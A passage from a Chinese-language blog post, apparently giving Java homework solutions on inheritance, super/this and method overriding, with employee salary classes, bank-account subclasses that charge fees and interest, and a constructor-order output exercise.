class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.hspedu.homework;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework04</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">staff</span> <span class="hljs-variable">jack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">staff</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">100</span>, <span class="hljs-number">20</span>, <span class="hljs-number">1.0</span>);<br>        <span class="hljs-type">manager</span> <span class="hljs-variable">tim</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">manager</span>(<span class="hljs-string">&quot;tim&quot;</span>, <span class="hljs-number">200</span>, <span class="hljs-number">23</span>, <span class="hljs-number">1.2</span>);<br>        tim.setBonus(<span class="hljs-number">1000</span>);<br>        jack.printsal();<br>        tim.printsal();<br><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">staff</span>&#123;<br>    <span class="hljs-comment">//员工属性：姓名，单日工资，工作天数</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> salary;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> workday;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> grade;<br>    <span class="hljs-comment">//员工方法（打印工资）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printsal</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;姓名：&quot;</span>+name+<span class="hljs-string">&quot; 工资：&quot;</span>+salary*workday*grade);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">staff</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> salary, <span class="hljs-type">int</span> workday, <span class="hljs-type">double</span> grade)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.salary = salary;<br>        <span class="hljs-built_in">this</span>.workday = workday;<br>        <span class="hljs-built_in">this</span>.grade = grade;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getSalary</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> salary;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSalary</span><span class="hljs-params">(<span class="hljs-type">double</span> salary)</span> &#123;<br>        <span class="hljs-built_in">this</span>.salary = salary;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getWorkday</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> workday;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setWorkday</span><span class="hljs-params">(<span class="hljs-type">int</span> workday)</span> &#123;<br>        <span class="hljs-built_in">this</span>.workday = workday;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getGrade</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> grade;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setGrade</span><span class="hljs-params">(<span class="hljs-type">double</span> grade)</span> &#123;<br>        <span class="hljs-built_in">this</span>.grade = grade;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">employee</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">staff</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">employee</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> salary, <span class="hljs-type">int</span> workday, <span class="hljs-type">double</span> grade)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name, salary, workday, grade);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printsal</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>.printsal();<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">manager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">staff</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> bonus;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printsal</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;姓名：&quot;</span>+getName()+<span class="hljs-string">&quot; 工资：&quot;</span>+(getSalary()*getWorkday()*getGrade()+getBonus()));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">manager</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> salary, <span class="hljs-type">int</span> workday, <span class="hljs-type">double</span> grade)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name, salary, workday, grade);<br>        <span class="hljs-built_in">this</span>.bonus = bonus;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBonus</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> bonus;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBonus</span><span class="hljs-params">(<span class="hljs-type">double</span> bonus)</span> &#123;<br>        <span class="hljs-built_in">this</span>.bonus = bonus;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><blockquote><p>设计父类一员工类。子类：工人类，农民类，教师类，科学家类，服务生类。</p><p>（1）其中工人，农民，服务生只有基本工资<br>（2）教师除基本工资外，还有课酬（元／天）<br>（3）科学家除基本工资外，还有年终奖<br>（4）编写一个测试类，将各种类型的员工的全年工资打印出来</p></blockquote><p>父类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> &#123;<br>    <span class="hljs-comment">//分析一个带薪的月份</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> sal;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">salMonth</span> <span class="hljs-operator">=</span> <span class="hljs-number">12</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printsal</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;姓名：&quot;</span>+name+<span class="hljs-string">&quot; 全年工资：&quot;</span>+(sal*salMonth));<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Employee</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> sal)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.sal = sal;<br>    &#125;<br>  <br><span class="hljs-comment">/*</span><br><span class="hljs-comment">  省略getset方法</span><br></code></pre></td></tr></table></figure><p>工人(农民，服务生):</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Employee</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Worker</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> sal)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name, sal);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printsal</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;工人 &quot;</span>);<br>        <span class="hljs-built_in">super</span>.printsal();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>教师：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Teacher</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Employee</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> classDay;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> classSal;<br><span class="hljs-comment">//重写printsal（）</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printsal</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;老师 &quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;姓名：&quot;</span>+getName()+<span class="hljs-string">&quot; 全年工资：&quot;</span>+(getSal()*getSalMonth()+getClassDay()*getClassSal()));<br>    &#125;  <br>  <br><span class="hljs-comment">/*构造器、get()、set()</span><br></code></pre></td></tr></table></figure><p>科学家：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Scientist</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Employee</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> bouns;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Scientist</span><span class="hljs-params">(String name, <span class="hljs-type">double</span> sal, <span class="hljs-type">double</span> bouns)</span> &#123;<br>        <span class="hljs-built_in">super</span>(name, sal);<br>        <span class="hljs-built_in">this</span>.bouns = bouns;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBouns</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> bouns;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBouns</span><span class="hljs-params">(<span class="hljs-type">double</span> bouns)</span> &#123;<br>        <span class="hljs-built_in">this</span>.bouns = bouns;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printsal</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;科学家 &quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;姓名：&quot;</span>+getName()+<span class="hljs-string">&quot; 全年工资：&quot;</span>+(getSal()*getSalMonth()+bouns));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Homework05</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Worker</span> <span class="hljs-variable">jack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Worker</span>(<span class="hljs-string">&quot;jack&quot;</span>, <span class="hljs-number">3000</span>);<br>        jack.printsal();<br>        <span class="hljs-type">Peasant</span> <span class="hljs-variable">smith</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Peasant</span>(<span class="hljs-string">&quot;smith&quot;</span>, <span class="hljs-number">20000</span>);<br>        smith.printsal();<br>        <span class="hljs-type">Teacher</span> <span class="hljs-variable">ann</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Teacher</span>(<span class="hljs-string">&quot;ann&quot;</span>, <span class="hljs-number">2000</span>, <span class="hljs-number">200</span>, <span class="hljs-number">100</span>);<br>        ann.printsal();<br>        <span class="hljs-type">Scientist</span> <span class="hljs-variable">zns</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scientist</span>(<span class="hljs-string">&quot;钟南山&quot;</span>, <span class="hljs-number">20000</span>, <span class="hljs-number">1000</span>);<br>        zns.printsal();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/image-20220929181102270.png" alt="image-20220929181102270" style="zoom:50%;" /><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>简答题：</p><blockquote><p>在父类和子类中通过this和super都可以调用哪些属性和方法，假定 Grand、 Father 和Son在同一个包<br>class Grand{<br>String name&#x3D;”AA”;<br>private int age&#x3D;100;<br>public void g1(){}}</p></blockquote><blockquote><p> class Father extends Grand{<br>String id&#x3D;”001”;<br>private double score;<br>public void f1{<br>／／super可以访问哪些成员（属性和方法）？<br>／／this可以访问哪些成员？<br>}</p></blockquote><p>super.name;super.g1()</p><p>this.id;this.score;this.f1();this.name;this.g1();</p><blockquote><p>class Son extends Father{<br>String name&#x3D;”BB”;<br>pubic void g1(){<br>private void show(){<br>／／super可以访问哪些成员（属性和方法）？<br>／／this可以访问哪些成员？<br>}<br>}</p></blockquote><p>super.name; super.id;super.f1();super.g1();</p><p>this.name;this.id;this.g1();this.show();this.f1()</p><p>注意点：修饰符权限，重写，查找顺序</p><h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><p>写出以下程序执行结果：</p><blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>&#123;<br>   <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Rose&quot;</span>;<br>   Test()&#123;<br>     System.out.println(<span class="hljs-string">&quot;Test&quot;</span>);<br>   &#125;<br>   Test(String name)&#123;<br>   <span class="hljs-built_in">this</span>.name = name;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Test</span>&#123;<br>      String name=<span class="hljs-string">&quot;Jack&quot;</span>;<br>      Demo() &#123;<br>          <span class="hljs-built_in">super</span>();<br>          System.out.println(<span class="hljs-string">&quot;Demo&quot;</span>); <br>      &#125;<br>      Demo(String s)&#123;<br>      <span class="hljs-built_in">super</span>(s);<br>      &#125;<br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span>&#123;<br>          System.out.println(<span class="hljs-built_in">super</span>.name);<br>          System.out.println(<span class="hljs-built_in">this</span>.name); <br>      &#125;<br>      <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span><br>      &#123;<br>          <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>().test();<br>          <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;john&quot;</span>).test();<br>      &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>Test、Demo、Rose、Jack、john、Jack</p><p>分析：</p><p><code>new Demo().test();</code>创建一个匿名对象。</p><p>先到Demo()，调用super()，走到父类Test，运行无参构造器，输出<strong>Test</strong>。</p><p>回到Demo()，输出<strong>Demo</strong>。</p><p>运行test，super.name输出父类name <strong>Rose</strong>。this.name 输出name <strong>Jack</strong>。</p><p><code>new Demo(&quot;john&quot;).test();</code>到Demo(String s)的super(s)走到父类的Test(String name)，由于属性没有动态绑定机制，this指的是父类的Rose。<code>this.name = name</code>指的是父类的Rose变为john。</p><p>到test()方法，super.name输出<strong>john</strong>，this.name输出<strong>Jack</strong>。</p><h3 id="7"><a href="#7" class="headerlink" title="7"></a>7</h3><blockquote><p> 扩展如下的BankAccount类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BankAccount</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> balance;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">BankAccount</span><span class="hljs-params">(<span class="hljs-type">double</span> initialBalance)</span> &#123;<br>        <span class="hljs-built_in">this</span>.balance = initialBalance;<br>    &#125;<br>    <span class="hljs-comment">//存款</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deposit</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> &#123;<br>        balance += amount;<br>    &#125;<br>    <span class="hljs-comment">//取钱</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">withdraw</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span>&#123;<br>        balance -= amount;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getBalance</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> balance;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBalance</span><span class="hljs-params">(<span class="hljs-type">double</span> balance)</span> &#123;<br>        <span class="hljs-built_in">this</span>.balance = balance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><blockquote><p>要求：<br>（1）在上面类的基础上扩展 新类CheckingAccount对每次存款和取款都收取1美元的手续费</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CheckingAccount</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BankAccount</span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CheckingAccount</span><span class="hljs-params">(<span class="hljs-type">double</span> initialBalance)</span> &#123;<br>        <span class="hljs-built_in">super</span>(initialBalance);<br>    &#125;<br><br>    <span class="hljs-comment">//存款</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deposit</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> &#123;<br>        <span class="hljs-built_in">super</span>.deposit(amount-<span class="hljs-number">1</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//取钱</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">withdraw</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> &#123;<br>        <span class="hljs-built_in">super</span>.withdraw(amount+<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>（2）扩展前一个练习的BankAccount类，新类<br>SavingsAccount每个月都有利息产生（earnMonthlylnterest方法被调用），并且有每月三次免手续费的存款或取款。在earnMonthlyInterest方法中重置交易计数</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SavingsAccount</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BankAccount</span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count=<span class="hljs-number">3</span>;<span class="hljs-comment">//次数</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> <span class="hljs-variable">rate</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.01</span>; <span class="hljs-comment">//利率</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">earnMonthlyInterest</span><span class="hljs-params">()</span>&#123;<br>        count = <span class="hljs-number">3</span>;<br>        <span class="hljs-built_in">super</span>.deposit(getBalance()*rate);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deposit</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> &#123;<br>        <span class="hljs-comment">//判断是否还可以免手续费</span><br>        <span class="hljs-keyword">if</span> (count&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">super</span>.deposit(amount);<br>            count--;<br>        &#125; <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">super</span>.deposit(amount-<span class="hljs-number">1</span>); <span class="hljs-comment">//手续费1元</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">withdraw</span><span class="hljs-params">(<span class="hljs-type">double</span> amount)</span> &#123;<br>        <span class="hljs-keyword">if</span> (count&gt;<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">super</span>.withdraw(amount);<br>            count--;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">super</span>.withdraw(amount+<span class="hljs-number">1</span>); <span class="hljs-comment">//手续费1元</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SavingsAccount</span><span class="hljs-params">(<span class="hljs-type">double</span> initialBalance)</span> &#123;<br>        <span class="hljs-built_in">super</span>(initialBalance);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> count;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCount</span><span class="hljs-params">(<span class="hljs-type">int</span> count)</span> &#123;<br>        <span class="hljs-built_in">this</span>.count = count;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getRate</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> rate;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setRate</span><span class="hljs-params">(<span class="hljs-type">double</span> rate)</span> &#123;<br>        <span class="hljs-built_in">this</span>.rate = rate;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="8"><a href="#8" class="headerlink" title="8"></a>8</h3><blockquote><p>编写Doctor类 ｛name， age， job， gender， sal｝<br>相应的getter（）和setter（）方法，5个参数的构造器，重写父类的equals（）方法：publicboolean equals（Object obj），并判断测试类中创建的两个对象是否相等。相等就是判断属性是否相同</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 